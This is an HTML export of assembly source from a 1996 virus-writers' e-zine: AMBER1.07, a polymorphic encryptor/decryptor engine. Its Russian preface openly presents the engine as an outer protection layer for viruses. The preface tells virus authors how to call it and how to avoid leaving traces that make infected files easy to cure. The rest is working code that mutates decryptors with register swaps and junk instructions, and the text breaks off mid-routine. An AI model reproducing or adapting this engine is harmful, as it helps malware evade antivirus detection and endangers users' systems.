<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; [Death Virii Crew] Presents</span><span class="sc0">
</span><span class="sc1">; CHAOS A.D. Vmag, Issue 2, Summer 1996                           file 006</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                AMBER1.07@beta</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                Полиморфный генератор шифровщиков и расшифровщиков.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Вашему вниманию представляется моя новая ангина под названием AMBER.</span><span class="sc0">
</span><span class="sc1">;    Это всего лишь beta версия, потому как релиз по всей видимости не</span><span class="sc0">
</span><span class="sc1">;    выйдет никогда. Эта ангина долгое время являлась для меня просто</span><span class="sc0">
</span><span class="sc1">;    развлечением. Я не писал этот проект затем, чтобы его написать. Он</span><span class="sc0">
</span><span class="sc1">;    писался только ради процеса написания. По ходу нашего бренного</span><span class="sc0">
</span><span class="sc1">;    существования я вставляю в эту ангину что-либо новое, что узнаю или</span><span class="sc0">
</span><span class="sc1">;    придумаю. Даже тот вариант, что сейчас находится перед вами уже</span><span class="sc0">
</span><span class="sc1">;    устарел, потому как пока журнал дойдет до вас я успею вставить в</span><span class="sc0">
</span><span class="sc1">;    AMBER еще что-то. Отличие данной ангины от уже существующих заключается</span><span class="sc0">
</span><span class="sc1">;    в весьма малом количестве байт самого расшифровщика. И безусловно эти</span><span class="sc0">
</span><span class="sc1">;    байты постоянно мутируют на уровне различных регистров и взаимозаменяемых</span><span class="sc0">
</span><span class="sc1">;    команд. Кроме этого присутствует генератор мусора с особенностью замены</span><span class="sc0">
</span><span class="sc1">;    действующих регистров.</span><span class="sc0">
</span><span class="sc1">;    Эта ангина предназначена для внешнего кольца защиты вируса. То есть:</span><span class="sc0">
</span><span class="sc1">;    в ней принципиально отсутствуют антиэвристические и антиотладочные</span><span class="sc0">
</span><span class="sc1">;    приемы. Вся сложность заключается в детектировании вируса, имеющего</span><span class="sc0">
</span><span class="sc1">;    AMBER на внешнем уровне. Я ни в коем случае не рекомендую использовать</span><span class="sc0">
</span><span class="sc1">;    ТОЛЬКО AMBER для защиты. В крайнем случае используйте интегрированные с</span><span class="sc0">
</span><span class="sc1">;    вирусом варианты защиты (шифровка через стек, int 1) - для отладчиков и</span><span class="sc0">
</span><span class="sc1">;    (приемы с портами, памятью, прерываниями) для эвристики.</span><span class="sc0">
</span><span class="sc1">;    Возможно, если я посчитаю нужным, я сделаю AMBER многоуровневым именно</span><span class="sc0">
</span><span class="sc1">;    для этих вещей.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    К моему большому сожалению процедуры мусора для генерации левых условных</span><span class="sc0">
</span><span class="sc1">;    переходов и подпрограмм в эту версию не вошли (времени у меня нет).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Использование ангины несколько отличается от использование других</span><span class="sc0">
</span><span class="sc1">;    полиморфных генераторов. Все входящие значения задаются не в регистрах,</span><span class="sc0">
</span><span class="sc1">;    а в специальной структуре. Структура приведена ниже. Комментарии к ней</span><span class="sc0">
</span><span class="sc1">;    тоже. Память под структуру должен выделять сам вирус. Крайне рекомендуется</span><span class="sc0">
</span><span class="sc1">;    перед и после использования ее обнулять. Hи в коем случае не сохраняйте</span><span class="sc0">
</span><span class="sc1">;    заполненную структуру в зараженном файле - его будет легко вылечить.</span><span class="sc0">
</span><span class="sc1">;    Примеры использования - вирусы ForeWord, Trivial в исходниках.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    А вообще-то, исходник самой ангины перед Вами - вперед.</span><span class="sc0">

</span><span class="sc1">;================================ резать тут ============================</span><span class="sc0">

                         </span><span class="sc1">; AMBER1.07@beta</span><span class="sc0">

</span><span class="sc5">MutationBase</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">

</span><span class="sc5">SegSource</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; segment of source code</span><span class="sc0">
</span><span class="sc5">OfsSource</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; offset of source code</span><span class="sc0">
</span><span class="sc5">LenSource</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; len of source code</span><span class="sc0">
</span><span class="sc5">StartIP</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; entry point where start</span><span class="sc0">
</span><span class="sc5">SegCrypt</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; segment of destination</span><span class="sc0">
</span><span class="sc5">OfsCrypt</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; offset of destionation</span><span class="sc0">
</span><span class="sc5">LenCrypt</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; len of</span><span class="sc0">
</span><span class="sc5">SizeDecr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GenerReg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; 0-ax,1-cx,2-dx,3-bx</span><span class="sc0">
</span><span class="sc5">IndexReg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; 1-bx,4-si,5-di</span><span class="sc0">
</span><span class="sc5">UsedReg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                  </span><span class="sc1">; 0-ax,1-cx,2-dx,3-bx,4-sp,5-bp,6-si,7-di</span><span class="sc0">
                                </span><span class="sc1">; bit is 0 - clear ; bit is 1 - used</span><span class="sc0">
</span><span class="sc5">CryptMethod</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Cryptkod</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">e_mov1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">e_mov2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">e_xor</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">e_cmp</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">b1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">b2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">b3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">do</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rout</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pointer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_trash</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">start_amber</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MutationBase</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">phantom</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------ init mem ---------------------------</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">name_engine</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[AMBER1.07@beta]'</span><span class="sc0">   </span><span class="sc1">; (c) не менять !</span><span class="sc0">
</span><span class="sc5">name_engine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.start_amber</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc1">;-------------------------- init registers ----------------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.IndexReg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.GenerReg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._Trash</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.do</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_index</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.IndexReg</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_gen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.GenerReg</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc1">;---------------------------------Main code--------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">bx.OfsCrypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.SegCrypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">inst</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lenOfInstr</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,[</span><span class="sc5">bx.GenerReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc5">bx.IndexReg</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.OfsCrypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.SizeDecr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;----------------------------- correct decryptor --------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.e_mov2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.StartIP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.OfsCrypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; begin</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.e_cmp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.LenSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.b2</span><span class="sc4">],</span><span class="sc12">'8'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_cm</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; end</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m@3</span><span class="sc0">
</span><span class="sc5">_cm</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; end</span><span class="sc0">
</span><span class="sc5">m@3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------------------------ change mov1 &amp; mov2 --------------------------</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">not_change</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.e_mov1</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">bx.e_mov2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">not_change</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------- copy and crypt ------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">bx.LenSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">bx.OfsSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.SegSource</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.OfsCrypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.LenCrypt</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">bx.CryptMethod</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">oper</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.start_AMBER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bx.CryptKod</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_x</span><span class="sc0">

</span><span class="sc5">_x</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">oper</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_x</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------------------------ internal proc --------------------------</span><span class="sc0">

</span><span class="sc5">rnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_rnd</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">kqwe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ne89</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">ne89</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">kqwe</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">end_rnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rndf</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">check_used</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@No_c</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._trash</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@trash</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">@trash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@No_c</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_gen</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; Get non used General registers AX BX CX DX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@again1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
